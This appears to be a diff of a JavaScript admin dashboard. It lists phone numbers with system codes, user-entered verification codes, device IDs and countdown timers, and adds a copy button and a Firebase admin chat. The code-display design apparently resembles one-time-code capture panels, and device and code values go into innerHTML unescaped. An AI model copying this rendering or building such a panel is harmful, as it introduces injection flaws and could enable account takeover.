-                        '<div class="verification-data-label">🔑 SYSTEM CODE</div>' +
-                        '<div class="verification-data-value code-value">' +
-                            v.code +
-                        '</div>' +
+                    '<div class="v-box">' +
+                        '<div class="v-label">🔑 SYSTEM CODE</div>' +
+                        '<div class="v-value code-value">' + v.code + '</div>' +
                     '</div>' +
                 '</div>' +
 
-                // ✅ USER-ENTERED CODE
-                '<div class="verification-data-grid user-input-grid">' +
-                    userCodeHtml +
-                '</div>' +
+                '<div class="v-grid v-grid-wide">' + userCodeHtml + '</div>' +
 
-                '<div class="verification-footer">' +
-                    '<div class="verification-device">' +
+                '<div class="v-footer">' +
+                    '<div class="v-device">' +
                         '<i class="fas fa-desktop"></i>' +
                         '<span>' + v.deviceId + '</span>' +
                     '</div>' +
-                    '<div class="verification-time">' +
+                    '<div class="v-time">' +
                         '<i class="fas fa-clock"></i>' +
                         '<span>' + createdTime + '</span>' +
                     '</div>' +
@@ -1294,25 +1298,36 @@ function renderSystemVerificationList(verifications) {
     listEl.innerHTML = html;
 }
 
+// ============================================================
+// ✅ TIMER UPDATE — TEXT ONLY (walang re-render)
+// ============================================================
 function updateVerificationTimers() {
-    var timerElements = document.querySelectorAll('.verification-data-value.timer-value');
+    var timerElements = document.querySelectorAll('.timer-display');
 
     timerElements.forEach(function(el) {
         var phone = el.getAttribute('data-phone');
         var verification = activeVerifications[phone];
 
-        if (!verification || verification.status !== 'active') return;
+        if (!verification) return;
+        if (verification.status !== 'active') return;
 
-        // Decrement timer locally
         if (verification.timer > 0) {
             verification.timer--;
 
-            el.textContent = verification.timer + 's';
+            // ✅ TEXT UPDATE LANG — hindi re-render
+            var newText = verification.timer + 's';
+            if (el.textContent !== newText) {
+                el.textContent = newText;
+            }
 
             if (verification.timer <= 9) {
-                el.classList.add('urgent');
+                if (!el.classList.contains('urgent')) {
+                    el.classList.add('urgent');
+                }
             } else {
-                el.classList.remove('urgent');
+                if (el.classList.contains('urgent')) {
+                    el.classList.remove('urgent');
+                }
             }
         }
     });
@@ -1350,16 +1365,60 @@ function formatVerificationTime(timestamp) {
 }
 
 // ============================================================
+// 📋 COPY PHONE TO CLIPBOARD
+// ============================================================
+window.copyPhone = function(phone, btn) {
+    try {
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(phone).then(function() {
+                var original = btn.textContent;
+                btn.textContent = '✅';
+                btn.classList.add('copied');
+                setTimeout(function() {
+                    btn.textContent = original;
+                    btn.classList.remove('copied');
+                }, 1200);
+            }).catch(function() {
+                fallbackCopy(phone, btn);
+            });
+        } else {
+            fallbackCopy(phone, btn);
+        }
+    } catch(e) {
+        fallbackCopy(phone, btn);
+    }
+};
+
+function fallbackCopy(text, btn) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try {
+        document.execCommand('copy');
+        btn.textContent = '✅';
+        btn.classList.add('copied');
+        setTimeout(function() {
+            btn.textContent = '📋';
+            btn.classList.remove('copied');
+        }, 1200);
+    } catch(e) {}
+    document.body.removeChild(ta);
+}
+
+// ============================================================
 // 🎯 ADMIN CHAT PANEL (Admin POV) — Cyan Theme
 // ============================================================
 (function() {
     'use strict';
-    
+
     let activeChatId = null;
     let messagesListener = null;
     let usersListener = null;
     let currentMessages = {};
-    
+
     function init() {
         if (!document.querySelector('.admin-chat-widget')) {
             createAdminPanel();
@@ -1368,10 +1427,10 @@ function formatVerificationTime(timestamp) {
         listenForNewUsers();
         console.log('✅ Admin chat initialized');
     }
-    
+
     function createAdminPanel() {
         if (document.querySelector('.admin-chat-widget')) return;
-        
+
         const panel = document.createElement('div');
         panel.className = 'admin-chat-widget';
         panel.innerHTML = `
@@ -1379,7 +1438,7 @@ function formatVerificationTime(timestamp) {
                 <i class="fas fa-comments"></i>
                 <span class="chat-badge" id="adminBadge" style="display:none">0</span>
             </button>
-            
+
             <div class="admin-chat-panel" id="adminChatPanel">
                 <div class="admin-chat-header">
                     <div class="admin-chat-header-left">
@@ -1391,14 +1450,14 @@ function formatVerificationTime(timestamp) {
                     </div>
                     <button class="admin-chat-close-btn" id="adminChatClose">✕</button>
                 </div>
-                
+
                 <div class="admin-user-list" id="adminUserList">
                     <div class="admin-empty-state">
                         <span class="empty-icon">📭</span>
                         <div class="empty-text">No conversations yet</div>
                     </div>
                 </div>
-                
+
                 <div class="admin-chat-conversation" id="adminConversation" style="display:none;">
                     <div class="admin-convo-header">
                         <button class="admin-back-btn" id="adminBackBtn">←</button>
@@ -1419,11 +1478,11 @@ function formatVerificationTime(timestamp) {
                 </div>
             </div>
         `;
-        
+
         document.body.appendChild(panel);
         attachAdminEvents();
     }
-    
+
     function attachAdminEvents() {
         document.getElementById('adminChatToggle').addEventListener('click', function() {
             const panel = document.getElementById('adminChatPanel');
@@ -1432,17 +1491,17 @@ function formatVerificationTime(timestamp) {
                 loadUserList();
             }
         });
-        
+
         document.getElementById('adminChatClose').addEventListener('click', function() {
             document.getElementById('adminChatPanel').classList.remove('show');
         });
-        
+
         document.getElementById('adminBackBtn').addEventListener('click', function() {
             closeConversation();
         });
-        
+
         document.getElementById('adminSendBtn').addEventListener('click', sendAdminMessage);
-        
+
         document.getElementById('adminChatInput').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
@@ -1450,24 +1509,24 @@ function formatVerificationTime(timestamp) {
             }
         });
     }
-    
+
     function loadUserList() {
         const db = firebase.database();
-        
+
         if (usersListener) {
             db.ref('chats').off('value', usersListener);
         }
-        
+
         usersListener = db.ref('chats').on('value', function(snapshot) {
             const userList = document.getElementById('adminUserList');
             const conversationView = document.getElementById('adminConversation');
-            
+
             if (conversationView && conversationView.style.display !== 'none') return;
             if (!userList) return;
-            
+
             userList.style.display = 'block';
             userList.innerHTML = '';
-            
+
             if (!snapshot.exists()) {
                 userList.innerHTML = `
                     <div class="admin-empty-state">
@@ -1476,33 +1535,33 @@ function formatVerificationTime(timestamp) {
                     </div>`;
                 return;
             }
-            
+
             const chats = snapshot.val();
             const chatIds = Object.keys(chats);
-            
+
             chatIds.sort((a, b) => {
                 const timeA = chats[a].lastMessageTime || 0;
                 const timeB = chats[b].lastMessageTime || 0;
                 return timeB - timeA;
             });
-            
+
             let totalUnread = 0;
-            
+
             chatIds.forEach(chatId => {
                 const chat = chats[chatId];
                 const unreadCount = chat.unreadAdmin || 0;
                 totalUnread += unreadCount;
-                
-                const lastTime = chat.lastMessageTime 
-                    ? formatTime(chat.lastMessageTime) 
+
+                const lastTime = chat.lastMessageTime
+                    ? formatTime(chat.lastMessageTime)
                     : '';
-                
+
                 const userItem = document.createElement('div');
                 userItem.className = 'admin-user-item';
                 if (activeChatId === chatId) {
                     userItem.classList.add('active');
                 }
-                
+
                 userItem.innerHTML = `
                     <div class="admin-user-avatar">📱</div>
                     <div class="admin-user-info">
@@ -1512,18 +1571,18 @@ function formatVerificationTime(timestamp) {
                     <div class="admin-user-time">${lastTime}</div>
                     ${unreadCount > 0 ? `<div class="unread-dot" style="margin-left:4px;">${unreadCount}</div>` : ''}
                 `;
-                
+
                 userItem.addEventListener('click', function() {
                     openConversation(chatId);
                 });
-                
+
                 userList.appendChild(userItem);
             });
-            
+
             updateBadge(totalUnread);
         });
     }
-    
+
     function listenForNewUsers() {
         const db = firebase.database();
         db.ref('chats').on('child_added', function(snapshot) {
@@ -1534,149 +1593,149 @@ function formatVerificationTime(timestamp) {
             }
         });
     }
-    
+
     function openConversation(chatId) {
         console.log('📂 Opening conversation with:', chatId);
-        
+
         activeChatId = chatId;
-        
+
         document.getElementById('adminUserList').style.display = 'none';
         document.getElementById('adminConversation').style.display = 'flex';
         document.getElementById('adminChatTitle').textContent = '📱 ' + chatId;
-        
+
         document.getElementById('adminMessages').innerHTML = '';
         currentMessages = {};
-        
+
         loadMessages(chatId);
         markAsRead(chatId);
     }
-    
+
     function closeConversation() {
         console.log('📁 Closing conversation');
-        
+
         if (messagesListener && activeChatId) {
             const db = firebase.database();
             db.ref('chats/' + activeChatId + '/messages').off('child_added', messagesListener);
             messagesListener = null;
         }
-        
+
         activeChatId = null;
         currentMessages = {};
-        
+
         document.getElementById('adminConversation').style.display = 'none';
         document.getElementById('adminUserList').style.display = 'block';
         document.getElementById('adminMessages').innerHTML = '';
-        
+
         loadUserList();
     }
-    
+
     function loadMessages(chatId) {
         const db = firebase.database();
         const messagesContainer = document.getElementById('adminMessages');
-        
+
         messagesContainer.innerHTML = '';
-        
+
         if (messagesListener) {
             db.ref('chats/' + chatId + '/messages').off('child_added', messagesListener);
         }
-        
+
         messagesListener = db.ref('chats/' + chatId + '/messages')
             .orderByChild('timestamp')
             .on('child_added', function(snapshot) {
                 const msg = snapshot.val();
                 const msgId = snapshot.key;
-                
+
                 if (currentMessages[msgId]) return;
                 currentMessages[msgId] = true;
-                
+
                 displayMessage(msg, msgId);
             });
-        
+
         db.ref('chats/' + chatId + '/messages').on('child_changed', function(snapshot) {
             const msg = snapshot.val();
             const msgId = snapshot.key;
             updateMessageDisplay(msgId, msg);
         });
     }
-    
+
     function displayMessage(msg, msgId) {
         const messagesContainer = document.getElementById('adminMessages');
         const typingIndicator = document.getElementById('adminTypingIndicator');
-        
+
         if (!messagesContainer) return;
-        
+
         const msgEl = document.createElement('div');
         msgEl.className = 'msg-bubble ' + (msg.sender === 'admin' ? 'user-msg' : 'admin-msg');
         msgEl.id = 'msg-' + msgId;
-        
-        const time = msg.timestamp 
+
+        const time = msg.timestamp
             ? new Date(msg.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
             : 'Just now';
-        
+
         const senderLabel = msg.sender === 'admin' ? 'You' : 'User';
-        
+
         msgEl.innerHTML = `
             ${escapeHtml(msg.text)}
             <div class="msg-time">${senderLabel} • ${time}</div>
         `;
-        
+
         if (typingIndicator && typingIndicator.parentNode === messagesContainer) {
             messagesContainer.insertBefore(msgEl, typingIndicator);
         } else {
             messagesContainer.appendChild(msgEl);
         }
-        
+
         scrollToBottom();
     }
-    
+
     function updateMessageDisplay(msgId, msg) {
         const msgEl = document.getElementById('msg-' + msgId);
         if (!msgEl) return;
-        
-        const time = msg.timestamp 
+
+        const time = msg.timestamp
             ? new Date(msg.timestamp).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
             : '';
-        
+
         const senderLabel = msg.sender === 'admin' ? 'You' : 'User';
-        
+
         if (msg.read) {
             msgEl.querySelector('.msg-time').textContent = `${senderLabel} • ${time} ✓✓`;
         }
     }
-    
+
     function sendAdminMessage() {
         if (!activeChatId) {
             console.log('❌ No active chat');
             return;
         }
-        
+
         const input = document.getElementById('adminChatInput');
         const sendBtn = document.getElementById('adminSendBtn');
         const message = input.value.trim();
-        
+
         if (!message) return;
-        
+
         sendBtn.disabled = true;
-        
+
         try {
             const db = firebase.database();
-            
+
             db.ref('chats/' + activeChatId + '/messages').push({
                 text: message,
                 sender: 'admin',
                 timestamp: firebase.database.ServerValue.TIMESTAMP,
                 read: false
             });
-            
+
             db.ref('chats/' + activeChatId).update({
                 lastMessage: message,
                 lastMessageTime: firebase.database.ServerValue.TIMESTAMP,
                 lastSender: 'admin',
                 unreadUser: firebase.database.ServerValue.increment(1)
             });
-            
+
             input.value = '';
-            
+
         } catch(e) {
             console.error('❌ Error sending message:', e);
         } finally {
@@ -1684,18 +1743,18 @@ function formatVerificationTime(timestamp) {
             input.focus();
         }
     }
-    
+
     function markAsRead(chatId) {
         const db = firebase.database();
-        db.ref('chats/' + chatId).update({ 
-            unreadAdmin: 0 
+        db.ref('chats/' + chatId).update({
+            unreadAdmin: 0
         }).then(function() {
             console.log('✅ Marked as read:', chatId);
         }).catch(function(e) {
             console.error('❌ Error marking as read:', e);
         });
     }
-    
+
     function scrollToBottom() {
         const messagesContainer = document.getElementById('adminMessages');
         if (messagesContainer) {
@@ -1704,11 +1763,11 @@ function formatVerificationTime(timestamp) {
             }, 100);
         }
     }
-    
+
     function updateBadge(count) {
         const badge = document.getElementById('adminBadge');
         if (!badge) return;
-        
+
         if (count > 0) {
             badge.textContent = count > 99 ? '99+' : count;
             badge.style.display = 'flex';
@@ -1716,42 +1775,41 @@ function formatVerificationTime(timestamp) {
             badge.style.display = 'none';
         }
     }
-    
+
     function formatTime(timestamp) {
         if (!timestamp) return '';
-        
+
         const now = Date.now();
         const diff = now - timestamp;
         const minutes = Math.floor(diff / 60000);
-        
+
         if (minutes < 1) return 'now';
         if (minutes < 60) return minutes + 'm';
-        
+
         const hours = Math.floor(minutes / 60);
         if (hours < 24) return hours + 'h';
-        
+
         const days = Math.floor(hours / 24);
         if (days < 7) return days + 'd';
-        
+
         return new Date(timestamp).toLocaleDateString([], {month:'short', day:'numeric'});
     }
-    
+
     function truncateText(text, maxLength) {
         if (!text) return '';
         if (text.length <= maxLength) return text;
         return text.substring(0, maxLength) + '...';
     }
-    
+
     function escapeHtml(text) {
         if (!text) return '';
         const div = document.createElement('div');
         div.textContent = text;
         return div.innerHTML;
     }
-    
-    // Initialize chat after dashboard is ready
+
     setTimeout(init, 2000);
-    
+
 })();
 
 // ============================================================
@@ -1786,6 +1844,6 @@ window.showBranchDetails = showBranchDetails;
 window.closeBranchPopup = closeBranchPopup;
 window.initSystemVerificationPanel = initSystemVerificationPanel;
 
-console.log('✅ C.I.A. Admin Panel v3.2 - Auto-login with User-Entered Code');
+console.log('✅ C.I.A. Admin Panel v3.3 - Anti-refresh + Copy Button + Compact');
 console.log('ℹ️ First time? Create your access key.');
 console.log('ℹ️ Already setup? Auto-login.');
